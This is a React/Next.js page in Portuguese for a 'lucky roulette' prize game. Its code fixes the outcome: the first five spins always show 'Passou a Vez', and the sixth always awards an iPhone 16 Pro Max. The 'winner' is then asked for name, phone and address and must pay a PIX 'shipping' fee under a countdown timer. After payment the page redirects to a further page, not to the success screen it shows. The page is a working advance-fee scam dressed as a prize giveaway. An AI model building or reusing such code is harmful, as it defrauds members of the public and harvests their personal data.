"use client"
import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Loader2, Gift, Sparkles, Trophy, Copy, Clock, CheckCircle } from "lucide-react"
import { toast } from "@/hooks/use-toast"
import { useUrlParams } from "@/hooks/use-url-params"

interface Prize {
  id: string
  name: string
  icon: string
  color: string
}

interface ShippingOption {
  id: string
  name: string
  price: number
}

interface PixData {
  [key: string]: any
  hash: string
}

// Prêmios disponíveis
const prizes: Prize[] = [
  { id: "tv", name: 'Smart TV 55"', icon: "📺", color: "#3B82F6" },
  { id: "ac", name: "Ar Condicionado", icon: "❄️", color: "#10B981" },
  { id: "iphone", name: "iPhone 16 Pro Max", icon: "📱", color: "#F59E0B" },
  { id: "1000", name: "R$ 1.000", icon: "💰", color: "#EF4444" },
  { id: "500", name: "R$ 500", icon: "💵", color: "#8B5CF6" },
  { id: "pass", name: "Passou a Vez", icon: "❌", color: "#6B7280" },
]

const shippingOptions: ShippingOption[] = [
  { id: "pac", name: "PAC", price: 16.9 },
  { id: "sedex", name: "SEDEX", price: 27.9 },
  { id: "sedex10", name: "SEDEX 10", price: 32.5 },
]

export default function RoletaPage() {
  const [currentStep, setCurrentStep] = useState<"wheel" | "form" | "payment" | "success">("wheel")
  const [formStep, setFormStep] = useState(1)
  const [isSpinning, setIsSpinning] = useState(false)
  const [attempts, setAttempts] = useState(0)
  const [selectedPrize, setSelectedPrize] = useState<Prize | null>(null)
  const [showConfetti, setShowConfetti] = useState(false)
  const [displayedPrizes, setDisplayedPrizes] = useState<Prize[]>([])
  const [winningIndex, setWinningIndex] = useState(1) // Índice do prêmio que vai ganhar (sempre no meio)
  
  const { redirectWithParams } = useUrlParams()

  // Form data
  const [formData, setFormData] = useState({
    nome: "",
    telefone: "",
    cep: "",
    endereco: "",
    numero: "",
    bairro: "",
    cidade: "",
    estado: "",
    shipping: "",
  })

  // Payment data
  const [pixData, setPixData] = useState<PixData | null>(null)
  const [isGeneratingPix, setIsGeneratingPix] = useState(false)
  const [isCheckingPayment, setIsCheckingPayment] = useState(false)
  const [paymentTimer, setPaymentTimer] = useState(600) // 10 minutes

  // Inicializar os prêmios exibidos
  useEffect(() => {
    // Sempre mostrar 3 prêmios: o do meio será o vencedor
    const getRandomPrizes = (winningPrize: Prize) => {
      const otherPrizes = prizes.filter((p) => p.id !== winningPrize.id)
      const shuffled = [...otherPrizes].sort(() => Math.random() - 0.5)
      return [
        shuffled[0], // Prêmio de cima
        winningPrize, // Prêmio do meio (vencedor)
        shuffled[1], // Prêmio de baixo
      ]
    }

    // Determinar qual prêmio deve aparecer no meio baseado nas tentativas
    const targetPrize = attempts < 5 ? prizes.find((p) => p.id === "pass")! : prizes.find((p) => p.id === "iphone")!
    setDisplayedPrizes(getRandomPrizes(targetPrize))
  }, [attempts])

  const spinSlot = () => {
    if (isSpinning) return

    setIsSpinning(true)
    const newAttempts = attempts + 1
    setAttempts(newAttempts)

    // Determinar qual prêmio deve ganhar
    const targetPrize = newAttempts < 6 ? prizes.find((p) => p.id === "pass")! : prizes.find((p) => p.id === "iphone")!

    console.log(`Tentativa ${newAttempts}: Alvo é ${targetPrize.name}`)

    // Preparar os novos prêmios com o vencedor no meio
    const getRandomPrizes = (winningPrize: Prize) => {
      const otherPrizes = prizes.filter((p) => p.id !== winningPrize.id)
      const shuffled = [...otherPrizes].sort(() => Math.random() - 0.5)
      return [
        shuffled[0], // Prêmio de cima
        winningPrize, // Prêmio do meio (vencedor)
        shuffled[1], // Prêmio de baixo
      ]
    }

    // Simular animação de rolagem
    let animationStep = 0
    const maxSteps = 20

    const animate = () => {
      if (animationStep < maxSteps) {
        // Durante a animação, mostrar prêmios aleatórios
        const randomPrizes = [
          prizes[Math.floor(Math.random() * prizes.length)],
          prizes[Math.floor(Math.random() * prizes.length)],
          prizes[Math.floor(Math.random() * prizes.length)],
        ]
        setDisplayedPrizes(randomPrizes)
        animationStep++
        setTimeout(animate, 150) // 150ms entre cada mudança
      } else {
        // Animação terminou, mostrar resultado final
        const finalPrizes = getRandomPrizes(targetPrize)
        setDisplayedPrizes(finalPrizes)
        setIsSpinning(false)
        setSelectedPrize(targetPrize)

        if (targetPrize.id === "iphone") {
          setShowConfetti(true)
          setTimeout(() => setShowConfetti(false), 3000)
          setTimeout(() => setCurrentStep("form"), 2000)
        } else {
          toast({
            title: "Que pena!",
            description: `Você tirou: ${targetPrize.name}. Tente novamente!`,
            duration: 3000,
          })
        }
      }
    }

    animate()
  }

  const nextFormStep = () => {
    if (formStep === 1) {
      if (!formData.nome || !formData.telefone) {
        toast({
          title: "Erro",
          description: "Preencha todos os campos obrigatórios",
          variant: "destructive",
        })
        return
      }
    } else if (formStep === 2) {
      if (
        !formData.cep ||
        !formData.endereco ||
        !formData.numero ||
        !formData.bairro ||
        !formData.cidade ||
        !formData.estado
      ) {
        toast({
          title: "Erro",
          description: "Preencha todos os campos de endereço",
          variant: "destructive",
        })
        return
      }
    }
    setFormStep(formStep + 1)
  }

  const prevFormStep = () => {
    setFormStep(formStep - 1)
  }

  const handleFormSubmit = async () => {
    if (!formData.shipping) {
      toast({
        title: "Erro",
        description: "Selecione uma opção de frete",
        variant: "destructive",
      })
      return
    }

    const selectedShipping = shippingOptions.find((opt) => opt.id === formData.shipping)
    if (!selectedShipping) return

    setIsGeneratingPix(true)

    try {
      const amount = Math.round(selectedShipping.price * 100) // Convert to cents

      console.log("Enviando dados para API da Roleta:", {
        nome: formData.nome,
        telefone: formData.telefone,
        amount: amount,
      })

      const response = await fetch("/api/gerar-pix-roleta", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          nome: formData.nome,
          telefone: formData.telefone,
          amount: amount,
          prize_name: "iPhone 16 Pro Max",
          utm_source: null,
          utm_medium: null,
          utm_campaign: null,
          utm_term: null,
          utm_content: null,
        }),
      })

      console.log("Status da resposta:", response.status)

      const data = await response.json()
      console.log("Resposta completa da API Roleta:", data)

      if (data.error) {
        toast({
          title: "Erro",
          description: data.mensagem || "Erro ao gerar PIX",
          variant: "destructive",
        })
        return
      }

      console.log("PIX gerado com sucesso:", data)
      console.log("Estrutura completa da resposta:", JSON.stringify(data, null, 2))
      
      // Extrair o hash correto da resposta
      const transactionHash = data.transaction_id || data.hash || data.id
      console.log("Transaction Hash extraído:", transactionHash)
      
      // Adicionar o hash ao pixData (seguindo mesmo padrão do bilhete-premiado)
      const pixDataWithHash = {
        ...data,
        hash: transactionHash
      }
      
      setPixData(pixDataWithHash)

      setCurrentStep("payment")
      setPaymentTimer(600) // Reset timer to 10 minutes

      toast({
        title: "PIX Gerado!",
        description: "Código PIX gerado com sucesso",
      })
    } catch (error) {
      console.error("Erro ao gerar PIX:", error)
      toast({
        title: "Erro",
        description: "Erro ao gerar PIX. Tente novamente.",
        variant: "destructive",
      })
    } finally {
      setIsGeneratingPix(false)
    }
  }

  const copyPixCode = () => {
    const pixCode = pixData?.pix_qr_code || pixData?.qr_code || pixData?.pix?.pix_qr_code || ""
    if (pixCode) {
      navigator.clipboard.writeText(pixCode)
      toast({
        title: "Copiado!",
        description: "Código PIX copiado para a área de transferência",
      })
    }
  }

  const checkPaymentStatus = async () => {
    if (!pixData?.hash) {
      console.error("❌ Hash da transação não encontrado:", pixData)
      toast({
        title: "Erro",
        description: "Hash da transação não encontrado",
        variant: "destructive",
      })
      return
    }

    setIsCheckingPayment(true)

    try {
      console.log("🔍 Verificando status para hash:", pixData.hash)

      const response = await fetch(`/api/verificar-status?hash=${pixData.hash}`)

      if (!response.ok) {
        console.error("❌ Erro HTTP:", response.status, response.statusText)
        throw new Error(`HTTP error! status: ${response.status}`)
      }

      const paymentData = await response.json()
      console.log("📦 Resposta completa da verificação:", JSON.stringify(paymentData, null, 2))

      if (paymentData.erro) {
        console.error("❌ Erro na verificação:", paymentData.mensagem)
        toast({
          title: "Erro",
          description: paymentData.mensagem,
          variant: "destructive",
        })
        return
      }

      // Check different possible status fields from various APIs
      const status = paymentData.payment_status || paymentData.status || paymentData.data?.status || paymentData.approved
      console.log("📌 Status do pagamento encontrado:", status)
      console.log("📌 Campos disponíveis:", Object.keys(paymentData))

      // Multiple checks for paid status
      const isPaid = status === "paid" || 
                   status === "approved" || 
                   status === "APPROVED" || 
                   paymentData.approved === true ||
                   paymentData.payment_status === "paid"

      if (isPaid) {
        console.log("✅ Pagamento confirmado! Redirecionando para roleta2...")

        toast({
          title: "Pagamento Confirmado!",
          description: "Redirecionando para próxima etapa...",
        })

        // Redirecionar para /roleta2 após 2 segundos
        setTimeout(() => {
          redirectWithParams("/roleta2")
        }, 2000)
      } else {
        console.log("⏳ Pagamento ainda pendente. Status atual:", status)
        toast({
          title: "Aguardando Pagamento",
          description: "O pagamento ainda não foi confirmado",
        })
      }
    } catch (error) {
      console.error("❌ Erro ao verificar status:", error)
      toast({
        title: "Erro",
        description: "Erro ao verificar pagamento. Tente novamente.",
        variant: "destructive",
      })
    } finally {
      setIsCheckingPayment(false)
    }
  }

  // Payment timer countdown
  useEffect(() => {
    if (currentStep === "payment" && paymentTimer > 0) {
      const timer = setTimeout(() => {
        setPaymentTimer(paymentTimer - 1)
      }, 1000)
      return () => clearTimeout(timer)
    }
  }, [currentStep, paymentTimer])

  // Auto-check payment every 5 seconds
  useEffect(() => {
    if (currentStep === "payment" && pixData?.hash) {
      const interval = setInterval(checkPaymentStatus, 5000)
      return () => clearInterval(interval)
    }
  }, [currentStep, pixData?.hash])

  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60)
    const remainingSeconds = seconds % 60
    return `${minutes.toString().padStart(2, "0")}:${remainingSeconds.toString().padStart(2, "0")}`
  }

  return (
    <div className="min-h-screen bg-black text-white relative overflow-hidden">
      {/* Background Effects */}
      <div className="absolute inset-0 bg-gradient-to-br from-yellow-900/20 via-black to-yellow-900/20" />
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(255,215,0,0.1),transparent_70%)]" />

      {/* Confetti Effect */}
      {showConfetti && (
        <div className="fixed inset-0 pointer-events-none z-50">
          {[...Array(50)].map((_, i) => (
            <div
              key={i}
              className="absolute animate-bounce"
              style={{
                left: `${Math.random() * 100}%`,
                top: `${Math.random() * 100}%`,
                animationDelay: `${Math.random() * 2}s`,
                animationDuration: `${2 + Math.random() * 2}s`,
              }}
            >
              <Sparkles className="text-yellow-400 w-6 h-6" />
            </div>
          ))}
        </div>
      )}

      <div className="relative z-10 container mx-auto px-4 py-8">
        {/* Header */}
        <div className="text-center mb-8">
          <img src="/images/logo.png" alt="PIX DO MILHÃO" className="mx-auto mb-4 h-20 w-auto" />
          <h1 className="text-4xl md:text-6xl font-bold bg-gradient-to-r from-yellow-400 to-yellow-600 bg-clip-text text-transparent mb-2">
            ROLETA DA SORTE
          </h1>
          <p className="text-xl text-yellow-300">Gire e ganhe prêmios incríveis!</p>
        </div>

        {/* Wheel Step */}
        {currentStep === "wheel" && (
          <div className="max-w-4xl mx-auto">
            <div className="text-center mb-8">
              <div className="inline-flex items-center gap-2 bg-yellow-900/30 px-4 py-2 rounded-full border border-yellow-600">
                <Trophy className="w-5 h-5 text-yellow-400" />
                <span className="text-yellow-300">Tentativa {attempts}/10</span>
              </div>
            </div>

            {/* Slot Machine Container */}
            <div className="flex flex-col items-center justify-center mb-8">
              {/* Slot Machine */}
              <div className="relative w-full max-w-md h-[240px] bg-gray-900 rounded-xl border-4 border-yellow-500 shadow-2xl overflow-hidden">
                {/* Gradient overlays for fade effect */}
                <div className="absolute top-0 left-0 right-0 h-20 bg-gradient-to-b from-gray-900 to-transparent z-10"></div>
                <div className="absolute bottom-0 left-0 right-0 h-20 bg-gradient-to-t from-gray-900 to-transparent z-10"></div>

                {/* Center marker line */}
                <div className="absolute top-1/2 left-0 right-0 h-[4px] bg-red-500 transform -translate-y-1/2 z-20 shadow-[0_0_10px_rgba(255,0,0,0.7)]"></div>

                {/* Slot items container */}
                <div className="absolute left-0 right-0 top-0">
                  {displayedPrizes.map((prize, index) => (
                    <div key={`${prize.id}-${index}`} className="flex items-center justify-center h-[80px] px-4 py-2">
                      <div
                        className={`w-full h-[70px] rounded-lg flex items-center justify-center gap-3 px-4 transition-all duration-300 ${
                          isSpinning ? "animate-pulse" : ""
                        }`}
                        style={{ backgroundColor: prize.color }}
                      >
                        <span className="text-3xl">{prize.icon}</span>
                        <span className="text-white font-bold text-lg">{prize.name}</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Decorative lights */}
              <div className="flex justify-between w-full max-w-md px-4 -mt-2 mb-6">
                {[...Array(8)].map((_, i) => (
                  <div
                    key={i}
                    className={`w-3 h-3 rounded-full ${isSpinning ? "animate-pulse" : ""}`}
                    style={{
                      backgroundColor: isSpinning ? ["#F59E0B", "#EF4444", "#10B981", "#3B82F6"][i % 4] : "#6B7280",
                    }}
                  />
                ))}
              </div>
            </div>

            {/* Spin Button */}
            <div className="text-center">
              <Button
                onClick={spinSlot}
                disabled={isSpinning}
                size="lg"
                className="bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-yellow-600 hover:to-yellow-700 text-black font-bold px-8 py-4 text-xl rounded-full shadow-lg shadow-yellow-400/50 transform hover:scale-105 transition-all duration-200"
              >
                {isSpinning ? (
                  <>
                    <Loader2 className="w-6 h-6 mr-2 animate-spin" />
                    Girando...
                  </>
                ) : (
                  <>
                    <Gift className="w-6 h-6 mr-2" />
                    GIRAR ROLETA
                  </>
                )}
              </Button>
            </div>

            {/* Result Display */}
            {selectedPrize && !isSpinning && (
              <div className="text-center mt-8">
                {selectedPrize.id === "iphone" ? (
                  <div className="animate-pulse">
                    <div className="bg-gradient-to-r from-yellow-500 to-yellow-600 text-black font-bold py-4 px-8 rounded-lg inline-block">
                      🎉 PARABÉNS! VOCÊ GANHOU O iPHONE 16 PRO MAX! 🎉
                    </div>
                  </div>
                ) : (
                  <div className="bg-gray-800/50 border border-gray-600 text-white font-bold py-3 px-6 rounded-lg inline-block">
                    {selectedPrize.icon} {selectedPrize.name}
                  </div>
                )}
              </div>
            )}
          </div>
        )}

        {/* Form Step */}
        {currentStep === "form" && (
          <div className="max-w-2xl mx-auto">
            <Card className="bg-gray-900/50 border-yellow-600">
              <CardContent className="p-6">
                <div className="text-center mb-6">
                  <img
                    src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Dessert_i_Phone_16_ebcba4c984-44KAipAwv56Q40hoYo5P7Uqhf4HFkh.webp"
                    alt="iPhone 16 Pro Max"
                    className="mx-auto mb-4 w-32 h-auto"
                  />
                  <h2 className="text-2xl font-bold text-yellow-400 mb-2">
                    Parabéns! Você ganhou o iPhone 16 Pro Max!
                  </h2>
                  <p className="text-gray-300">Preencha seus dados para receber o prêmio</p>
                </div>

                {/* Progress Steps */}
                <div className="flex justify-center mb-8 px-4">
                  <div className="flex items-center space-x-2 sm:space-x-4 w-full max-w-sm sm:max-w-none justify-center">
                    <div
                      className={`flex items-center justify-center w-8 h-8 sm:w-10 sm:h-10 rounded-full ${formStep >= 1 ? "bg-green-500" : "bg-gray-600"}`}
                    >
                      {formStep > 1 ? (
                        <CheckCircle className="w-4 h-4 sm:w-6 sm:h-6 text-white" />
                      ) : (
                        <span className="text-white font-bold text-sm sm:text-base">1</span>
                      )}
                    </div>
                    <span className="text-xs sm:text-sm text-gray-300 hidden sm:inline">Dados</span>

                    <div className="w-4 sm:w-8 h-0.5 bg-gray-600"></div>

                    <div
                      className={`flex items-center justify-center w-8 h-8 sm:w-10 sm:h-10 rounded-full ${formStep >= 2 ? "bg-green-500" : "bg-gray-600"}`}
                    >
                      {formStep > 2 ? (
                        <CheckCircle className="w-4 h-4 sm:w-6 sm:h-6 text-white" />
                      ) : (
                        <span className="text-white font-bold text-sm sm:text-base">2</span>
                      )}
                    </div>
                    <span className="text-xs sm:text-sm text-gray-300 hidden sm:inline">Detalhes</span>

                    <div className="w-4 sm:w-8 h-0.5 bg-gray-600"></div>

                    <div
                      className={`flex items-center justify-center w-8 h-8 sm:w-10 sm:h-10 rounded-full ${formStep >= 3 ? "bg-yellow-500" : "bg-gray-600"}`}
                    >
                      <span className="text-black font-bold text-sm sm:text-base">3</span>
                    </div>
                    <span className="text-xs sm:text-sm text-gray-300 hidden sm:inline">Pagamento</span>
                  </div>
                </div>

                {/* Mobile Step Labels */}
                <div className="flex justify-center mb-6 sm:hidden">
                  <div className="flex space-x-8 text-xs text-gray-300">
                    <span className={formStep >= 1 ? "text-green-400" : ""}>Dados</span>
                    <span className={formStep >= 2 ? "text-green-400" : ""}>Detalhes</span>
                    <span className={formStep >= 3 ? "text-yellow-400" : ""}>Pagamento</span>
                  </div>
                </div>

                {/* Step 1: Personal Data */}
                {formStep === 1 && (
                  <div className="space-y-4">
                    <h3 className="text-lg font-semibold text-yellow-400 mb-4">Dados Pessoais</h3>
                    <div>
                      <Label htmlFor="nome" className="text-yellow-300">
                        Nome Completo *
                      </Label>
                      <Input
                        id="nome"
                        value={formData.nome}
                        onChange={(e) => setFormData({ ...formData, nome: e.target.value })}
                        required
                        className="bg-gray-800 border-gray-600 text-white"
                        placeholder="Digite seu nome completo"
                      />
                    </div>
                    <div>
                      <Label htmlFor="telefone" className="text-yellow-300">
                        Telefone *
                      </Label>
                      <Input
                        id="telefone"
                        value={formData.telefone}
                        onChange={(e) => setFormData({ ...formData, telefone: e.target.value })}
                        required
                        className="bg-gray-800 border-gray-600 text-white"
                        placeholder="(11) 99999-9999"
                      />
                    </div>
                    <div className="flex justify-end">
                      <Button
                        onClick={nextFormStep}
                        className="bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-yellow-600 hover:to-yellow-700 text-black font-bold"
                      >
                        Próximo
                      </Button>
                    </div>
                  </div>
                )}

                {/* Step 2: Address */}
                {formStep === 2 && (
                  <div className="space-y-4">
                    <h3 className="text-lg font-semibold text-yellow-400 mb-4">Endereço de Entrega</h3>
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                      <div>
                        <Label htmlFor="cep" className="text-yellow-300">
                          CEP *
                        </Label>
                        <Input
                          id="cep"
                          value={formData.cep}
                          onChange={(e) => setFormData({ ...formData, cep: e.target.value })}
                          required
                          className="bg-gray-800 border-gray-600 text-white"
                          placeholder="00000-000"
                        />
                      </div>
                      <div className="md:col-span-2">
                        <Label htmlFor="endereco" className="text-yellow-300">
                          Endereço *
                        </Label>
                        <Input
                          id="endereco"
                          value={formData.endereco}
                          onChange={(e) => setFormData({ ...formData, endereco: e.target.value })}
                          required
                          className="bg-gray-800 border-gray-600 text-white"
                          placeholder="Rua, Avenida..."
                        />
                      </div>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                      <div>
                        <Label htmlFor="numero" className="text-yellow-300">
                          Número *
                        </Label>
                        <Input
                          id="numero"
                          value={formData.numero}
                          onChange={(e) => setFormData({ ...formData, numero: e.target.value })}
                          required
                          className="bg-gray-800 border-gray-600 text-white"
                          placeholder="123"
                        />
                      </div>
                      <div>
                        <Label htmlFor="bairro" className="text-yellow-300">
                          Bairro *
                        </Label>
                        <Input
                          id="bairro"
                          value={formData.bairro}
                          onChange={(e) => setFormData({ ...formData, bairro: e.target.value })}
                          required
                          className="bg-gray-800 border-gray-600 text-white"
                          placeholder="Centro"
                        />
                      </div>
                      <div>
                        <Label htmlFor="cidade" className="text-yellow-300">
                          Cidade *
                        </Label>
                        <Input
                          id="cidade"
                          value={formData.cidade}
                          onChange={(e) => setFormData({ ...formData, cidade: e.target.value })}
                          required
                          className="bg-gray-800 border-gray-600 text-white"
                          placeholder="São Paulo"
                        />
                      </div>
                    </div>

                    <div>
                      <Label htmlFor="estado" className="text-yellow-300">
                        Estado *
                      </Label>
                      <Input
                        id="estado"
                        value={formData.estado}
                        onChange={(e) => setFormData({ ...formData, estado: e.target.value })}
                        required
                        className="bg-gray-800 border-gray-600 text-white"
                        placeholder="SP"
                      />
                    </div>

                    <div className="flex justify-between">
                      <Button
                        onClick={prevFormStep}
                        variant="outline"
                        className="border-yellow-600 text-yellow-400 hover:bg-yellow-600 hover:text-black"
                      >
                        Voltar
                      </Button>
                      <Button
                        onClick={nextFormStep}
                        className="bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-yellow-600 hover:to-yellow-700 text-black font-bold"
                      >
                        Próximo
                      </Button>
                    </div>
                  </div>
                )}

                {/* Step 3: Shipping */}
                {formStep === 3 && (
                  <div className="space-y-4">
                    <h3 className="text-lg font-semibold text-yellow-400 mb-4">Opção de Frete</h3>
                    <p className="text-gray-300 mb-4">Você só paga o frete! O iPhone é totalmente GRÁTIS!</p>

                    <div>
                      <Label className="text-yellow-300">Selecione o frete *</Label>
                      <Select
                        value={formData.shipping}
                        onValueChange={(value) => setFormData({ ...formData, shipping: value })}
                      >
                        <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
                          <SelectValue placeholder="Escolha uma opção de frete" />
                        </SelectTrigger>
                        <SelectContent className="bg-gray-800 border-gray-600">
                          {shippingOptions.map((option) => (
                            <SelectItem key={option.id} value={option.id} className="text-white">
                              {option.name} - R$ {option.price.toFixed(2)}
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>

                    {formData.shipping && (
                      <div className="bg-green-900/30 p-4 rounded-lg">
                        <p className="text-green-300 font-semibold">
                          Frete selecionado: {shippingOptions.find((opt) => opt.id === formData.shipping)?.name}
                        </p>
                        <p className="text-green-200">
                          Valor: R$ {shippingOptions.find((opt) => opt.id === formData.shipping)?.price.toFixed(2)}
                        </p>
                      </div>
                    )}

                    <div className="flex justify-between">
                      <Button
                        onClick={prevFormStep}
                        variant="outline"
                        className="border-yellow-600 text-yellow-400 hover:bg-yellow-600 hover:text-black"
                      >
                        Voltar
                      </Button>
                      <Button
                        onClick={handleFormSubmit}
                        disabled={isGeneratingPix || !formData.shipping}
                        className="bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-yellow-600 hover:to-yellow-700 text-black font-bold py-3"
                      >
                        {isGeneratingPix ? (
                          <>
                            <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                            Gerando PIX...
                          </>
                        ) : (
                          "GERAR PIX"
                        )}
                      </Button>
                    </div>
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        )}

        {/* Payment Step */}
        {currentStep === "payment" && pixData && (
          <div className="max-w-2xl mx-auto">
            <Card className="bg-gray-900/50 border-yellow-600">
              <CardContent className="p-6">
                {/* Progress Steps */}
                <div className="flex justify-center mb-6 px-4">
                  <div className="flex items-center space-x-2 sm:space-x-4 w-full max-w-sm sm:max-w-none justify-center">
                    <div className="flex items-center justify-center w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-green-500">
                      <CheckCircle className="w-4 h-4 sm:w-6 sm:h-6 text-white" />
                    </div>
                    <span className="text-xs sm:text-sm text-gray-300 hidden sm:inline">Dados</span>

                    <div className="w-4 sm:w-8 h-0.5 bg-gray-600"></div>

                    <div className="flex items-center justify-center w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-green-500">
                      <CheckCircle className="w-4 h-4 sm:w-6 sm:h-6 text-white" />
                    </div>
                    <span className="text-xs sm:text-sm text-gray-300 hidden sm:inline">Detalhes</span>

                    <div className="w-4 sm:w-8 h-0.5 bg-gray-600"></div>

                    <div className="flex items-center justify-center w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-yellow-500">
                      <span className="text-black font-bold text-sm sm:text-base">3</span>
                    </div>
                    <span className="text-xs sm:text-sm text-gray-300 hidden sm:inline">Pagamento</span>
                  </div>
                </div>

                {/* Mobile Step Labels */}
                <div className="flex justify-center mb-6 sm:hidden">
                  <div className="flex space-x-8 text-xs text-gray-300">
                    <span className="text-green-400">Dados</span>
                    <span className="text-green-400">Detalhes</span>
                    <span className="text-yellow-400">Pagamento</span>
                  </div>
                </div>

                {/* Timer */}
                <div className="bg-red-900/50 border border-red-600 rounded-lg p-4 mb-6">
                  <div className="flex items-center gap-2 text-red-300">
                    <Clock className="w-5 h-5" />
                    <span className="font-semibold">Você tem {formatTime(paymentTimer)} para pagar</span>
                  </div>
                </div>

                <div className="text-center mb-6">
                  <h2 className="text-2xl font-bold text-yellow-400 mb-2">Pagamento do Frete</h2>
                  <p className="text-gray-300">Pague apenas o frete para receber seu iPhone 16 Pro Max</p>
                </div>

                <div className="space-y-6">
                  {/* Instructions */}
                  <div className="space-y-3">
                    <div className="flex items-center gap-3 text-yellow-300">
                      <div className="flex items-center justify-center w-6 h-6 rounded-full bg-yellow-500 text-black font-bold text-sm">
                        1
                      </div>
                      <span>Copie o código PIX</span>
                    </div>
                    <div className="flex items-center gap-3 text-yellow-300">
                      <div className="flex items-center justify-center w-6 h-6 rounded-full bg-yellow-500 text-black font-bold text-sm">
                        2
                      </div>
                      <span>Abra seu banco e escolha PIX</span>
                    </div>
                    <div className="flex items-center gap-3 text-yellow-300">
                      <div className="flex items-center justify-center w-6 h-6 rounded-full bg-yellow-500 text-black font-bold text-sm">
                        3
                      </div>
                      <span>Cole o código e confirme</span>
                    </div>
                  </div>

                  {/* PIX Code */}
                  <div>
                    <div className="flex gap-2">
                      <Input
                        value={pixData?.pix_qr_code || pixData?.qr_code || pixData?.pix?.pix_qr_code || ""}
                        readOnly
                        className="bg-gray-800 border-gray-600 text-white font-mono text-sm"
                      />
                      <Button
                        onClick={copyPixCode}
                        className="bg-yellow-500 hover:bg-yellow-600 text-black font-bold px-6"
                      >
                        <Copy className="w-4 h-4 mr-2" />
                        Copiar
                      </Button>
                    </div>
                  </div>

                  {/* Warning */}
                  <div className="bg-yellow-900/30 border border-yellow-600 rounded-lg p-4">
                    <p className="text-yellow-200 text-sm">
                      ⚠️ Pagamento deve ser realizado dentro do prazo, senão os números voltam a ficar disponíveis.
                    </p>
                  </div>

                  {/* Check Payment Button */}
                  <Button
                    onClick={checkPaymentStatus}
                    disabled={isCheckingPayment}
                    className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-bold py-3"
                  >
                    {isCheckingPayment ? (
                      <>
                        <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                        Verificando...
                      </>
                    ) : (
                      <>
                        <CheckCircle className="w-5 h-5 mr-2" />
                        Já fiz o pagamento
                      </>
                    )}
                  </Button>

                  {/* QR Code */}
                  <div className="text-center">
                    <div className="bg-white p-4 rounded-lg inline-block mb-4">
                      {(pixData?.pix_qr_code || pixData?.qr_code || pixData?.pix?.pix_qr_code) ? (
                        <img
                          src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixData?.pix_qr_code || pixData?.qr_code || pixData?.pix?.pix_qr_code || "")}`}
                          alt="QR Code PIX"
                          className="w-48 h-48"
                          crossOrigin="anonymous"
                        />
                      ) : (
                        <div className="w-48 h-48 bg-gray-200 flex items-center justify-center">
                          <span className="text-gray-500 text-sm">Carregando QR Code...</span>
                        </div>
                      )}
                    </div>
                    <p className="text-sm text-gray-400">📱 QR Code</p>
                    <p className="text-sm text-gray-400">
                      Escaneie com o app do seu banco na opção "Pagar com QR Code"
                    </p>
                  </div>

                  <p className="text-center text-sm text-gray-400">
                    O pagamento é verificado automaticamente a cada 5 segundos
                  </p>
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {/* Success Step */}
        {currentStep === "success" && (
          <div className="max-w-2xl mx-auto text-center">
            <Card className="bg-gradient-to-br from-green-900/50 to-green-800/50 border-green-500">
              <CardContent className="p-8">
                <div className="text-6xl mb-4">🎉</div>
                <h2 className="text-3xl font-bold text-green-400 mb-4">Pagamento Confirmado!</h2>
                <p className="text-xl text-green-300 mb-6">Seu iPhone 16 Pro Max será enviado em breve!</p>
                <div className="bg-green-900/30 p-4 rounded-lg">
                  <p className="text-green-200">
                    Você receberá um código de rastreamento por WhatsApp em até 24 horas.
                  </p>
                </div>
              </CardContent>
            </Card>
          </div>
        )}
      </div>
    </div>
  )
}
